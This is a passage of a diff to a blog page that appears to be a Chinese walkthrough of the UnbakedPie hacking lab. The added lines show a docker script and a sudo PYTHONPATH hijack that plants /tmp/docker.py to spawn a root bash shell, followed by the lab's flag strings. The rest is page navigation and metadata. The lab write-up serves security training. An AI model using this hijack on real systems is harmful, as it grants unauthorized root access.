+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># oliver, make sure to restart docker if it crashes or anything happened.</span></span><br><span class="line"><span class="comment"># i havent setup swap memory for it</span></span><br><span class="line"><span class="comment"># it is still in development, please dont let it live yet!!!</span></span><br><span class="line">client = docker.from_env()</span><br><span class="line">client.containers.run(<span class="string">&quot;python-django:latest&quot;</span>, <span class="string">&quot;sleep infinity&quot;</span>, detach=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>还是一样打环境变量劫持</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">touch /tmp/docker.py</span><br><span class="line">echo <span class="string">&quot;import pty&quot;</span> &gt;&gt; /tmp/docker.py</span><br><span class="line">echo <span class="string">&#x27;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> &gt;&gt; /tmp/docker.py</span><br><span class="line">sudo PYTHONPATH=/tmp python /opt/dockerScript.py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Unb4ked_W00tw00t</span><br><span class="line">Unb4ked_GOtcha!</span><br></pre></td></tr></table></figure>
     </div>
     <footer class="article-footer">
         <a class="article-category-link" href="/categories/MazeSec/" title="MazeSec" data-aos="zoom-in">MazeSec</a>
 
-      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag" title="Pickle 反序列化">Pickle 反序列化</a></li></ul>
+
     </footer>
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
       <div class="article-nav-link-wrap left">
-            <img data-src="/images/banner.webp" data-sizes="auto" alt="MazeSec SuidyRevenge" class="lazyload">
-        <a href="/2025/04/01/SuidyRevenge/" aria-label="前一篇: MazeSec SuidyRevenge" title="前一篇: MazeSec SuidyRevenge"></a>
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="2025 年度总结" class="lazyload">
+        <a href="/2026/01/01/2025%20%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" aria-label="前一篇: 2025 年度总结" title="前一篇: 2025 年度总结"></a>
         <div class="article-nav-caption">前一篇</div>
         <h3 class="article-nav-title">
-            MazeSec SuidyRevenge
+            2025 年度总结
         </h3>
       </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/images/banner.webp" data-sizes="auto" alt="MazeSec Hommie" class="lazyload">
-      <a href="/2025/04/01/Hommie/" aria-label="后一篇: MazeSec Hommie"  title="后一篇: MazeSec Hommie"></a>
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="MazeSec Alzheimer" class="lazyload">
+      <a href="/2025/04/01/Alzheimer/" aria-label="后一篇: MazeSec Alzheimer"  title="后一篇: MazeSec Alzheimer"></a>
       <div class="article-nav-caption">后一篇</div>
       <h3 class="article-nav-title">
-          MazeSec Hommie
+          MazeSec Alzheimer
       </h3>
     </div>
   </nav>
@@ -285,10 +434,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        106.4k
+        108k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        08:51
+        08:58
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -310,7 +459,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UnbakedPie"><span class="toc-number">1.</span> <span class="toc-text">UnbakedPie</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UnbakedPie"><span class="toc-number">1.</span> <span class="toc-text">UnbakedPie</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.1.</span> <span class="toc-text">Pickle 反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.1.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">环境变量劫持</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -442,9 +591,9 @@
           url: "http://example.com/2025/04/01/UnbakedPie/",
           excerpt: "",
           description: "",
-          stripContent: "UnbakedPie项目地址：https://downloads.hackmyvm.eu/alzheimer.zip 是一个打包好的镜像文件 注意：导入 ova 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本 ",
-          date: "Tue Apr 01 2025 17:33:00 GMT+0800",
-          updated: "Wed Jun 03 2026 18:22:43 GMT+0800",
+          stripContent: "UnbakedPie项目地址：https://downloads.hackmyvm.eu/unbakedpie.zip 是一个打包好的镜像文件 注意：导入 ova 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  反序列化Pickle 反序列化查看网页，当我们搜索一个东西后会看到有 search_cookie 参数  在网络请求中看响应  进行 Base64 解码 180 04 95 07 00 00 00 00 00 00 00 8c 03 61 61 61 91",
+          date: "Tue Apr 01 2025 17:34:00 GMT+0800",
+          updated: "Thu Jun 04 2026 11:10:20 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
